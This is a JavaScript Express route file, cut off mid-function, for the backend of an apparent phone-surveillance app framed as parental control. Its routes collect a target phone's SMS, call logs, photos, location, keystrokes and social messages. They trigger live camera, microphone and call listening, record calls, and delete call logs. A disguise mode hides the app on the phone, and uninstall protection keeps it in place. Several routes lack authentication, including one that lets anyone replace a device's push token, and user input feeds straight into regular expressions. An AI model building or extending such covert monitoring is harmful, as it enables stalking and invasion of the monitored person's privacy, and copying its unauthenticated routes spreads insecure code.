const express = require('express');
const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, Screenshot, User, InstalledApp } = require('../models');
const { protect } = require('./auth');
const admin = require('firebase-admin');

const router = express.Router();

// Helper function to transform device for API response
const transformDevice = (device) => {
  const d = device.toObject ? device.toObject() : device;
  return {
    id: d._id.toString(),
    deviceId: d.deviceId,
    name: d.name,
    alias: d.alias || null,
    displayOrder: d.displayOrder || 0,
    model: d.model,
    androidVersion: d.androidVersion,
    isOnline: d.isOnline,
    batteryLevel: d.battery || 0,
    mobileDataEnabled: d.mobileDataEnabled || false,
    screenTime: d.screenTime || 0,
    lastSeen: d.lastSeen ? new Date(d.lastSeen).getTime() : 0,
    location: d.location,
    blockedApps: d.blockedApps || [],
    settings: d.settings,
    permissions: d.permissions || {
      location: false,
      backgroundLocation: false,
      camera: false,
      microphone: false,
      storage: false,
      callLog: false,
      contacts: false,
      sms: false,
      phone: false,
      notifications: false,
      usageStats: false,
      overlay: false,
      batteryOptimization: false,
      deviceAdmin: false,
      accessibility: false,
      restrictedSettings: false,
      lastUpdated: null
    }
  };
};

// Get all devices for current user
router.get('/', protect, async (req, res) => {
  try {
    const devices = await Device.find({ owner: req.user._id })
      .select('-__v')
      .sort({ displayOrder: 1, lastSeen: -1 }); // Sort by displayOrder first, then lastSeen
    
    res.json({
      success: true,
      count: devices.length,
      devices: devices.map(transformDevice)
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch devices' });
  }
});

// Reorder devices (must be before :deviceId routes)
router.put('/reorder', protect, async (req, res) => {
  try {
    const { deviceOrder } = req.body;

    if (!deviceOrder || !Array.isArray(deviceOrder)) {
      return res.status(400).json({ error: 'deviceOrder array is required' });
    }

    // Update order for each device
    for (let i = 0; i < deviceOrder.length; i++) {
      await Device.findOneAndUpdate(
        { _id: deviceOrder[i], owner: req.user._id },
        { $set: { displayOrder: i } }
      );
    }

    res.json({ success: true, message: 'Device order updated' });
  } catch (error) {
    console.error('Failed to reorder devices:', error);
    res.status(500).json({ error: 'Failed to reorder devices' });
  }
});

// Get single device details
router.get('/:deviceId', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    res.json({
      success: true,
      device: transformDevice(device)
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch device' });
  }
});

// Update device settings
router.put('/:deviceId/settings', protect, async (req, res) => {
  try {
    const { settings, blockedApps, name } = req.body;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const prevCallRecordEnabled = device.settings?.callRecordEnabled;
    if (settings) {
      device.settings = { ...device.settings, ...settings };
      device.markModified('settings');
    }
    if (blockedApps) device.blockedApps = blockedApps;
    if (name) device.name = name;

    await device.save();

    // If callRecordEnabled changed, send specific FCM command to device
    if (settings && settings.callRecordEnabled !== undefined && settings.callRecordEnabled !== prevCallRecordEnabled) {
      if (device.fcmToken) {
        try {
          const callRecordCommand = settings.callRecordEnabled ? 'DO_ENABLE_CALL_RECORDING' : 'DO_DISABLE_CALL_RECORDING';
          await admin.messaging().send({
            token: device.fcmToken,
            data: { command: callRecordCommand },
            android: { priority: 'high', ttl: 0 }
          });
          console.log(`[Settings] Sent ${callRecordCommand} to device`);
        } catch (fcmErr) {
          console.error('[Settings] Call recording FCM error:', fcmErr.message);
        }
      }
    }

    // Send settings update to device via FCM
    if (device.fcmToken) {
      try {
        await admin.messaging().send({
          token: device.fcmToken,
          data: {
            command: 'update_settings',
            settings: JSON.stringify(device.settings),
            blockedApps: JSON.stringify(device.blockedApps)
          }
        });
      } catch (fcmError) {
        console.error('FCM send error:', fcmError);
      }
    }

    res.json({
      success: true,
      device
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update settings' });
  }
});

// Update device permissions (called by Android app)
router.put('/:deviceId/permissions', async (req, res) => {
  try {
    const deviceIdParam = req.params.deviceId;
    const permissions = req.body;
    
    // Find device by MongoDB _id or Android deviceId
    let device = null;
    try {
      device = await Device.findById(deviceIdParam);
    } catch (e) {
      // Not a valid ObjectId
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceIdParam });
    }
    
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    // Map Android permission names to backend names
    device.permissions = {
      location: permissions.location || false,
      backgroundLocation: permissions.backgroundLocation || permissions.locationBackground || false,
      camera: permissions.camera || false,
      microphone: permissions.microphone || false,
      storage: permissions.storage || false,
      callLog: permissions.callLog || false,
      contacts: permissions.contacts || false,
      sms: permissions.sms || false,
      phone: permissions.phone || false,
      notifications: permissions.notifications || false,
      usageStats: permissions.usageStats || permissions.usageAccess || false,
      overlay: permissions.overlay || false,
      batteryOptimization: permissions.batteryOptimization || false,
      deviceAdmin: permissions.deviceAdmin || false,
      accessibility: permissions.accessibility || false,
      restrictedSettings: permissions.restrictedSettings || permissions.restrictionSettings || false,
      lastUpdated: new Date()
    };
    
    // Auto-detect Device Owner mode when deviceAdmin is true
    if (permissions.deviceAdmin && device.mode !== 'deviceOwner') {
      console.log(`[AUTO-DETECT DO] Device ${device.name} has deviceAdmin=true, auto-setting mode to deviceOwner`);
      device.mode = 'deviceOwner';
      device.deviceOwnerProvisioned = true;
      device.provisioningDate = device.provisioningDate || new Date();
      device.provisioningMethod = device.provisioningMethod || 'adb';
      if (!device.deviceOwnerPolicies) {
        device.deviceOwnerPolicies = {
          appHidden: false,
          uninstallProtected: true,
          accessibilityAutoRecover: true
        };
      }
    }
    
    await device.save();
    
    console.log(`Permissions updated for device ${device.name}: ${JSON.stringify(device.permissions)}`);
    
    res.json({ success: true, message: 'Permissions updated' });
  } catch (error) {
    console.error('Failed to update permissions:', error);
    res.status(500).json({ error: 'Failed to update permissions' });
  }
});

// Update device disguise mode
router.put('/:deviceId/disguise', async (req, res) => {
  try {
    const deviceIdParam = req.params.deviceId;
    const { disguiseMode } = req.body;
    
    // Find device by MongoDB _id or Android deviceId
    let device = null;
    try {
      device = await Device.findById(deviceIdParam);
    } catch (e) {
      // Not a valid ObjectId
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceIdParam });
    }
    
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    device.disguiseMode = disguiseMode || 'normal';
    await device.save();
    
    console.log(`Disguise mode updated for device ${device.name}: ${disguiseMode}`);
    
    res.json({ success: true, message: 'Disguise mode updated', mode: disguiseMode });
  } catch (error) {
    console.error('Failed to update disguise mode:', error);
    res.status(500).json({ error: 'Failed to update disguise mode' });
  }
});

// Send command to device
router.post('/:deviceId/command', protect, async (req, res) => {
  try {
    const { command, params } = req.body;
    const deviceIdParam = req.params.deviceId;
    
    // Try finding by MongoDB _id first, then by Android deviceId
    let device = null;
    try {
      device = await Device.findOne({
        _id: deviceIdParam,
        owner: req.user._id
      });
    } catch (e) {
      // Not a valid ObjectId, try by deviceId
    }
    
    if (!device) {
      device = await Device.findOne({
        deviceId: deviceIdParam,
        owner: req.user._id
      });
    }

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    if (!device.fcmToken) {
      console.log(`Device ${device.name} (${device.deviceId}) has no FCM token registered`);
      return res.status(400).json({ 
        error: 'Device not registered for push notifications',
        hint: 'The device app needs to sync with the server to register its FCM token'
      });
    }

    // Valid commands
    const validCommands = [
      'start_screen_mirror',
      'stop_screen_mirror',
      'start_camera',
      'stop_camera',
      'start_live_listen',
      'stop_live_listen',
      'stop_stream',
      // WebRTC streaming commands
      'start_webrtc_camera',
      'stop_webrtc_camera',
      'start_webrtc_screen',
      'stop_webrtc_screen',
      'start_webrtc_audio',
      'stop_webrtc_audio',
      'switch_camera',
      // Screenshot capture
      'capture_screenshot',
      'sync_data',
      'delete_call_logs',
      'lock_device',
      'unlock_device',
      'ring_device',
      'stop_ring',
      'update_blocked_apps',
      'open_app',
      'sync_photos',
      'update_location',
      'record_audio',
      'enable_call_recording',
      'disable_call_recording',
      'live_call_listen',
      'get_location',
      'wipe_data',
      'uninstall_app',
      // App disguise commands
      'set_disguise_mode',
      'reset_app', // Show real app again
      // Permission request commands
      'request_location_permission',
      'request_background_location_permission',
      'request_camera_permission',
      'request_microphone_permission',
      'request_contacts_permission',
      'request_sms_permission',
      'request_call_log_permission',
      'request_storage_permission',
      'request_phone_permission',
      'request_notification_permission',
      'request_usage_access_permission',
      'request_overlay_permission',
      'request_battery_optimization_permission',
      'request_device_admin_permission',
      'request_accessibility_permission',
      'request_all_permissions'
    ];

    if (!validCommands.includes(command)) {
      return res.status(400).json({ error: 'Invalid command' });
    }

    // Check if Firebase is initialized
    if (!admin.apps.length) {
      console.warn('Firebase not initialized - cannot send command');
      return res.status(503).json({ 
        error: 'Push notifications not configured on server',
        details: 'Firebase Admin SDK credentials not set'
      });
    }

    // Send FCM message with high priority for background delivery
    const message = {
      token: device.fcmToken,
      data: {
        command,
        params: params ? JSON.stringify(params) : '',
        timestamp: Date.now().toString()
      },
      android: {
        priority: 'high',
        ttl: 60000, // 1 minute
        // Direct boot mode support for locked devices
        directBootOk: true
      },
      // Additional settings for reliable background delivery
      apns: {
        headers: {
          'apns-priority': '10'
        },
        payload: {
          aps: {
            contentAvailable: true
          }
        }
      }
    };

    console.log(`Sending ${command} command to device ${device.name} (${device.deviceId})`);
    console.log(`FCM Token (first 20 chars): ${device.fcmToken?.substring(0, 20)}...`);
    
    try {
      const messageId = await admin.messaging().send(message);
      console.log(`Command sent successfully, messageId: ${messageId}`);

      res.json({
        success: true,
        message: `Command '${command}' sent to device`
      });
    } catch (fcmError) {
      console.error('FCM send error:', fcmError.code, fcmError.message);
      
      // Handle specific FCM errors
      if (fcmError.code === 'messaging/invalid-registration-token' || 
          fcmError.code === 'messaging/registration-token-not-registered') {
        // Token is invalid or expired - clear it from device record
        device.fcmToken = null;
        await device.save();
        
        return res.status(400).json({ 
          error: 'Device FCM token expired',
          hint: 'The device app needs to reconnect and register a new token',
          code: 'FCM_TOKEN_EXPIRED'
        });
      }
      
      throw fcmError;
    }
  } catch (error) {
    console.error('Command error:', error);
    res.status(500).json({ error: 'Failed to send command', details: error.message });
  }
});

// Delete device (unpair) - requires PIN if set
router.delete('/:deviceId', protect, async (req, res) => {
  try {
    // Check if user has security PIN set
    const { User } = require('../models');
    const user = await User.findById(req.user._id);
    
    if (user.securityPin) {
      const { pin } = req.body || {};
      if (!pin) {
        return res.status(400).json({ 
          error: 'Security PIN required',
          requiresPin: true 
        });
      }
      if (pin !== user.securityPin) {
        return res.status(401).json({ error: 'Invalid security PIN' });
      }
    }
    
    // First, find the device to get FCM token before deleting
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    // Send FCM notification to unpair the child device
    if (device.fcmToken) {
      try {
        await admin.messaging().send({
          token: device.fcmToken,
          data: {
            command: 'unpair_device',
            timestamp: Date.now().toString()
          },
          android: {
            priority: 'high',
            ttl: 60000
          }
        });
        console.log('Unpair command sent to child device:', device.deviceId);
      } catch (fcmError) {
        console.error('Failed to send unpair FCM notification:', fcmError);
        // Continue with deletion even if FCM fails
      }
    }
    
    // Now delete the device
    await Device.findByIdAndDelete(device._id);

    // Remove from user's devices list
    await req.user.updateOne({
      $pull: { devices: device._id }
    });

    // Delete ALL associated data from all collections
    const { SMS, BrowserHistory, KeystrokeSession, SocialMessage, SocialContact } = require('../models');
    await Promise.all([
      Notification.deleteMany({ deviceId: device.deviceId }),
      CallLog.deleteMany({ deviceId: device.deviceId }),
      AppUsage.deleteMany({ deviceId: device.deviceId }),
      LocationHistory.deleteMany({ deviceId: device.deviceId }),
      Photo.deleteMany({ deviceId: device.deviceId }),
      Screenshot.deleteMany({ deviceId: device.deviceId }),
      SMS.deleteMany({ deviceId: device.deviceId }),
      BrowserHistory.deleteMany({ deviceId: device.deviceId }),
      KeystrokeSession.deleteMany({ deviceId: device.deviceId }),
      SocialMessage.deleteMany({ deviceId: device.deviceId }),
      SocialContact.deleteMany({ deviceId: device.deviceId })
    ]);
    
    console.log(`All data deleted for device: ${device.deviceId} - Notifications, CallLogs, AppUsage, Location, Photos, Screenshots, SMS, BrowserHistory, Keystrokes, SocialMessages, SocialContacts`);

    res.json({
      success: true,
      message: 'Device removed successfully'
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete device' });
  }
});

// Get device notifications
router.get('/:deviceId/notifications', protect, async (req, res) => {
  try {
    const { limit = 50, skip = 0, app } = req.query;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const query = { deviceId: device.deviceId };
    if (app) query.packageName = new RegExp(app, 'i');

    const notifications = await Notification.find(query)
      .sort({ timestamp: -1 })
      .skip(parseInt(skip))
      .limit(parseInt(limit));

    const total = await Notification.countDocuments(query);

    res.json({
      success: true,
      total,
      notifications
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch notifications' });
  }
});

// Delete all notifications for a device
router.delete('/:deviceId/notifications', protect, async (req, res) => {
  try {
    console.log('[Notifications DELETE] deviceId param:', req.params.deviceId);
    console.log('[Notifications DELETE] user:', req.user?._id);
    
    // Try to find device by _id first, then by deviceId field
    let device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });
    
    // If not found by _id, try by deviceId field
    if (!device) {
      device = await Device.findOne({
        deviceId: req.params.deviceId,
        owner: req.user._id
      });
    }
    
    // If still not found, try without owner check (for debugging)
    if (!device) {
      const anyDevice = await Device.findOne({ _id: req.params.deviceId });
      if (anyDevice) {
        console.log('[Notifications DELETE] Device exists but owner mismatch. Device owner:', anyDevice.owner, 'Request user:', req.user._id);
      } else {
        console.log('[Notifications DELETE] Device not found at all');
      }
      return res.status(404).json({ error: 'Device not found or access denied' });
    }

    const result = await Notification.deleteMany({ deviceId: device.deviceId });
    
    console.log(`[Notifications] Deleted ${result.deletedCount} notifications for device ${device.name}`);
    
    res.json({
      success: true,
      deletedCount: result.deletedCount,
      message: `Deleted ${result.deletedCount} notifications`
    });
  } catch (error) {
    console.error('Error deleting notifications:', error);
    res.status(500).json({ error: 'Failed to delete notifications' });
  }
});

// Get device call logs
router.get('/:deviceId/call-logs', protect, async (req, res) => {
  try {
    const { limit = 50, skip = 0, type } = req.query;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const query = { deviceId: device.deviceId };
    if (type) query.type = type;

    const callLogs = await CallLog.find(query)
      .sort({ timestamp: -1 })
      .skip(parseInt(skip))
      .limit(parseInt(limit));

    const total = await CallLog.countDocuments(query);

    // Get stats
    const stats = await CallLog.aggregate([
      { $match: { deviceId: device.deviceId } },
      {
        $group: {
          _id: '$type',
          count: { $sum: 1 }
        }
      }
    ]);

    res.json({
      success: true,
      total,
      stats: stats.reduce((acc, s) => ({ ...acc, [s._id]: s.count }), {}),
      callLogs
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch call logs' });
  }
});

// Delete call logs from child device remotely
router.delete('/:deviceId/call-logs', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Send command to device to delete call logs locally
    if (device.fcmToken) {
      await admin.messaging().send({
        token: device.fcmToken,
        data: {
          command: 'delete_call_logs',
          timestamp: Date.now().toString()
        },
        android: {
          priority: 'high'
        }
      });
    }

    // Delete from server database too
    await CallLog.deleteMany({ deviceId: device.deviceId });

    res.json({
      success: true,
      message: 'Call logs deletion command sent'
    });
  } catch (error) {
    console.error('Delete call logs error:', error);
    res.status(500).json({ error: 'Failed to delete call logs' });
  }
});

// Get device location history
router.get('/:deviceId/location', protect, async (req, res) => {
  try {
    const { limit = 100 } = req.query;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const locations = await LocationHistory.find({ deviceId: device.deviceId })
      .sort({ timestamp: -1 })
      .limit(parseInt(limit));

    res.json({
      success: true,
      currentLocation: device.location,
      history: locations
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch location' });
  }
});

// Get device app usage
router.get('/:deviceId/apps', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Get today's app usage aggregated
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const appUsage = await AppUsage.aggregate([
      {
        $match: {
          deviceId: device.deviceId,
          date: { $gte: today }
        }
      },
      {
        $group: {
          _id: '$packageName',
          appName: { $first: '$appName' },
          totalTime: { $sum: '$usageTime' },
          openCount: { $sum: '$openCount' }
        }
      },
      { $sort: { totalTime: -1 } }
    ]);

    res.json({
      success: true,
      blockedApps: device.blockedApps,
      usage: appUsage
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch app usage' });
  }
});

// Get all installed apps on device (for Device Owner hide/uninstall)
router.get('/:deviceId/installed-apps', protect, async (req, res) => {
  try {
    const deviceIdParam = req.params.deviceId;
    const mongoose = require('mongoose');
    
    let device = null;
    if (mongoose.Types.ObjectId.isValid(deviceIdParam)) {
      device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
    }
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    // Get all installed apps
    const apps = await InstalledApp.find({ deviceId: device.deviceId })
      .sort({ appName: 1 });
    
    // Get hidden apps from device policies
    const hiddenApps = device.deviceOwnerPolicies?.hiddenApps || [];
    
    // Mark which apps are hidden
    const appsWithStatus = apps.map(app => ({
      packageName: app.packageName,
      appName: app.appName,
      isSystemApp: app.isSystemApp,
      isEnabled: app.isEnabled,
      isHidden: hiddenApps.includes(app.packageName) || app.isHidden,
      lastSeenAt: app.lastSeenAt
    }));
    
    res.json({
      success: true,
      apps: appsWithStatus,
      total: appsWithStatus.length
    });
  } catch (error) {
    console.error('Failed to fetch installed apps:', error);
    res.status(500).json({ error: 'Failed to fetch installed apps' });
  }
});

// Get device photos/gallery with date filtering
router.get('/:deviceId/photos', protect, async (req, res) => {
  try {
    const { hours = 24, limit = 50, startDate, endDate, page = 1, source } = req.query;

    console.log('[Photos API] Request params:', { deviceId: req.params.deviceId, startDate, endDate, hours, page, source });

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Build date filter - use $or to catch both dateTaken and timestamp fields
    let dateFilter = {};
    if (startDate && endDate) {
      // If both dates provided, search by dateTaken OR timestamp (whichever matches)
      const startD = new Date(startDate);
      const endD = new Date(new Date(endDate).setHours(23, 59, 59, 999));
      dateFilter.$or = [
        { dateTaken: { $gte: startD, $lte: endD } },
        { timestamp: { $gte: startD, $lte: endD } }
      ];
      console.log('[Photos API] Date filter applied (OR logic):', { startD, endD });
    } else if (startDate) {
      // Just start date
      const startD = new Date(startDate);
      dateFilter.$or = [
        { dateTaken: { $gte: startD } },
        { timestamp: { $gte: startD } }
      ];
    } else if (endDate) {
      // Just end date
      const endD = new Date(new Date(endDate).setHours(23, 59, 59, 999));
      dateFilter.$or = [
        { dateTaken: { $lte: endD } },
        { timestamp: { $lte: endD } }
      ];
    } else {
      // Default: use hours for cutoff on timestamp
      const cutoffTime = new Date(Date.now() - (parseInt(hours) * 60 * 60 * 1000));
      dateFilter.timestamp = { $gte: cutoffTime };
      console.log('[Photos API] Using hours filter, cutoff:', cutoffTime);
    }

    // Build source filter (album)
    let sourceFilter = {};
    if (source && source !== 'all') {
      sourceFilter.source = source;
    }

    const skip = (parseInt(page) - 1) * parseInt(limit);

    const photos = await Photo.find({
      deviceId: device.deviceId,
      ...dateFilter,
      ...sourceFilter
    })
    .sort({ dateTaken: -1 })
    .skip(skip)
    .limit(parseInt(limit))
    .select('-fullImageBase64'); // Don't send full images in list view

    const total = await Photo.countDocuments({
      deviceId: device.deviceId,
      ...dateFilter,
      ...sourceFilter
    });

    console.log('[Photos API] Query result:', { found: photos.length, total, deviceId: device.deviceId });
    if (photos.length > 0) {
      console.log('[Photos API] First photo dateTaken:', photos[0].dateTaken);
    }

    // Get album counts for filtering
    const albumCounts = await Photo.aggregate([
      { $match: { deviceId: device.deviceId, ...dateFilter } },
      { $group: { _id: '$source', count: { $sum: 1 } } }
    ]);

    const albums = {
      all: total,
      Camera: 0,
      Screenshot: 0,
      WhatsApp: 0,
      Telegram: 0,
      Download: 0,
      Other: 0
    };
    albumCounts.forEach(a => {
      const key = a._id || 'Other';
      if (albums.hasOwnProperty(key)) {
        albums[key] = a.count;
      } else {
        albums.Other += a.count;
      }
    });
    // Recalculate 'all' as sum of all albums
    albums.all = Object.keys(albums).filter(k => k !== 'all').reduce((sum, k) => sum + albums[k], 0);

    // Get storage info - RECALCULATE from actual Photo collection to handle TTL auto-deletes
    const user = await User.findById(req.user._id);
    const storageAgg = await Photo.aggregate([
      { $match: { deviceId: device.deviceId } },
      { $group: { _id: null, totalSize: { $sum: '$size' } } }
    ]);
    const actualStorageUsed = storageAgg.length > 0 ? storageAgg[0].totalSize : 0;
    const storageLimit = user?.photoStorageLimit || (200 * 1024 * 1024);
    
    // Fix stale storage counter if it differs from reality (e.g., TTL deleted photos)
    if (user && Math.abs((user.photoStorageUsed || 0) - actualStorageUsed) > 1024) {
      user.photoStorageUsed = actualStorageUsed;
      await user.save();
      console.log(`[Photos] Fixed stale storage: was ${user.photoStorageUsed}, actual ${actualStorageUsed}`);
    }
    const storageUsed = actualStorageUsed;

    res.json({
      success: true,
      total,
      page: parseInt(page),
      totalPages: Math.ceil(total / parseInt(limit)),
      storageUsed,
      storageLimit,
      storagePercentage: Math.round((storageUsed / storageLimit) * 100),
      albums, // Album counts for tabs
      photos: photos.map(p => ({
        id: p._id,
        fileName: p.fileName,
        filePath: p.filePath,
        thumbnail: p.thumbnailBase64,
        mimeType: p.mimeType,
        width: p.width,
        height: p.height,
        size: p.size,
        dateTaken: p.dateTaken,
        timestamp: p.timestamp,
        source: p.source || 'Other',
        location: p.location || null
      }))
    });
  } catch (error) {
    console.error('Failed to fetch photos:', error);
    res.status(500).json({ error: 'Failed to fetch photos' });
  }
});

// Get single photo (full resolution)
router.get('/:deviceId/photos/:photoId', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const photo = await Photo.findOne({
      _id: req.params.photoId,
      deviceId: device.deviceId
    });

    if (!photo) {
      return res.status(404).json({ error: 'Photo not found' });
    }

    res.json({
      success: true,
      photo: {
        id: photo._id,
        fileName: photo.fileName,
        filePath: photo.filePath,
        image: photo.fullImageBase64 || photo.thumbnailBase64,
        mimeType: photo.mimeType,
        width: photo.width,
        height: photo.height,
        size: photo.size,
        dateTaken: photo.dateTaken,
        timestamp: photo.timestamp,
        source: photo.source || 'Other',
        location: photo.location || null
      }
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch photo' });
  }
});

// Get photo storage quota status
router.get('/:deviceId/photos/quota', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Calculate actual storage from database
    const stats = await Photo.aggregate([
      { $match: { deviceId: device.deviceId } },
      { $group: { _id: null, totalSize: { $sum: '$size' }, count: { $sum: 1 } } }
    ]);

    const user = await User.findById(req.user._id);
    const storageLimit = user?.photoStorageLimit || (200 * 1024 * 1024);
    const storageUsed = stats[0]?.totalSize || 0;
    const photoCount = stats[0]?.count || 0;

    // Update user's storage tracking to match reality
    await User.findByIdAndUpdate(req.user._id, {
      $set: { photoStorageUsed: storageUsed }
    });

    res.json({
      success: true,
      storageUsed,
      storageLimit,
      storagePercentage: Math.round((storageUsed / storageLimit) * 100),
      remainingStorage: Math.max(0, storageLimit - storageUsed),
      photoCount,
      quotaFull: storageUsed >= storageLimit
    });
  } catch (error) {
    console.error('Failed to get photo quota:', error);
    res.status(500).json({ error: 'Failed to get storage quota' });
  }
});

// Request photo sync from device
router.post('/:deviceId/photos/sync', protect, async (req, res) => {
  try {
    const { hours = 24 } = req.body;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    if (!device.fcmToken) {
      return res.status(400).json({ error: 'Device not connected' });
    }

    // Check if Firebase is initialized
    if (!admin.apps.length) {
      console.warn('Firebase not initialized - cannot send photo sync');
      return res.status(503).json({ 
        error: 'Push notifications not configured on server',
        details: 'Firebase Admin SDK credentials not set'
      });
    }

    // Send FCM to sync photos
    await admin.messaging().send({
      token: device.fcmToken,
      data: {
        command: 'sync_photos',
        hours: hours.toString()
      },
      android: {
        priority: 'high'
      }
    });

    res.json({
      success: true,
      message: 'Photo sync request sent to device'
    });
  } catch (error) {
    console.error('Failed to request photo sync:', error);
    res.status(500).json({ error: 'Failed to send sync request', details: error.message });
  }
});

// Delete all photos for a device (parent side only - frees up DB storage)
router.delete('/:deviceId/photos/delete-all', protect, async (req, res) => {
  try {
    const deviceIdParam = req.params.deviceId;
    
    // Find device
    let device = null;
    const mongoose = require('mongoose');
    
    if (mongoose.Types.ObjectId.isValid(deviceIdParam)) {
      device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
    }
    if (!device) {
      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
    }
    
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    // Calculate total size of photos being deleted
    const photosToDelete = await Photo.find({ deviceId: device.deviceId }).select('size');
    const totalSize = photosToDelete.reduce((sum, p) => sum + (p.size || 0), 0);
    
    // Delete all photos for this device
    const result = await Photo.deleteMany({ deviceId: device.deviceId });
    
    // Always recalculate and set storage to actual value (handles TTL-deleted photos too)
    const remaining = await Photo.aggregate([
      { $match: { deviceId: device.deviceId } },
      { $group: { _id: null, totalSize: { $sum: '$size' } } }
    ]);
    const remainingSize = remaining.length > 0 ? remaining[0].totalSize : 0;
    
    await User.findByIdAndUpdate(req.user._id, {
      $set: { photoStorageUsed: remainingSize }
    });
  
    console.log(`[Photos] Deleted ${result.deletedCount} photos (${(totalSize / 1024 / 1024).toFixed(2)}MB) for device ${device.name}`);
    
    res.json({
      success: true,
      deletedCount: result.deletedCount,
      freedStorage: totalSize,
      message: `Deleted ${result.deletedCount} photos from server`
    });
  } catch (error) {
    console.error('Failed to delete photos:', error);
    res.status(500).json({ error: 'Failed to delete photos' });
  }
});

// Update FCM token for a device (called by Android app)
router.put('/:deviceId/fcm-token', async (req, res) => {
  try {
    const { fcmToken } = req.body;
    const deviceId = req.params.deviceId;
    
    if (!fcmToken) {
      return res.status(400).json({ error: 'FCM token is required' });
    }
    
    // Find device by deviceId (Android device ID) or MongoDB _id
    let device = await Device.findOne({ deviceId: deviceId });
    if (!device) {
      device = await Device.findById(deviceId);
    }
    
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    device.fcmToken = fcmToken;
    device.lastSeen = new Date();
    device.isOnline = true;
    await device.save();
    
    console.log(`FCM token updated for device: ${device.name} (${device.deviceId})`);
    
    res.json({
      success: true,
      message: 'FCM token updated'
    });
  } catch (error) {
    console.error('Failed to update FCM token:', error);
    res.status(500).json({ error: 'Failed to update FCM token' });
  }
});

// Also support POST for FCM token (backwards compatibility)
router.post('/:deviceId/fcm-token', async (req, res) => {
  try {
    const { fcmToken } = req.body;
    const deviceId = req.params.deviceId;
    
    if (!fcmToken) {
      return res.status(400).json({ error: 'FCM token is required' });
    }
    
    let device = await Device.findOne({ deviceId: deviceId });
    if (!device) {
      device = await Device.findById(deviceId);
    }
    
    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    device.fcmToken = fcmToken;
    device.lastSeen = new Date();
    device.isOnline = true;
    await device.save();
    
    console.log(`FCM token updated for device: ${device.name} (${device.deviceId})`);
    
    res.json({
      success: true,
      message: 'FCM token updated'
    });
  } catch (error) {
    console.error('Failed to update FCM token:', error);
    res.status(500).json({ error: 'Failed to update FCM token' });
  }
});

// ============ SMS ENDPOINTS ============

// Get SMS messages for a device
router.get('/:deviceId/sms', protect, async (req, res) => {
  try {
    const { limit = 100, page = 1, search, type } = req.query;
    const deviceIdParam = req.params.deviceId;

    // Find device
    let device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
    if (!device) {
      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
    }

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Build query
    const query = { deviceId: device.deviceId };
    if (type) query.type = type;
    if (search) {
      query.$or = [
        { address: new RegExp(search, 'i') },
        { contactName: new RegExp(search, 'i') },
        { body: new RegExp(search, 'i') }
      ];
    }

    const skip = (parseInt(page) - 1) * parseInt(limit);

    const [sms, total] = await Promise.all([
      SMS.find(query)
        .sort({ date: -1 })
        .skip(skip)
        .limit(parseInt(limit)),
      SMS.countDocuments(query)
    ]);

    res.json({
      sms: sms.map(m => ({
        id: m._id.toString(),
        address: m.address,
        contactName: m.contactName,
        body: m.body,
        type: m.type,
        read: m.read,
        date: m.date
      })),
      total,
      pages: Math.ceil(total / parseInt(limit)),
      currentPage: parseInt(page)
    });
  } catch (error) {
    console.error('Failed to get SMS:', error);
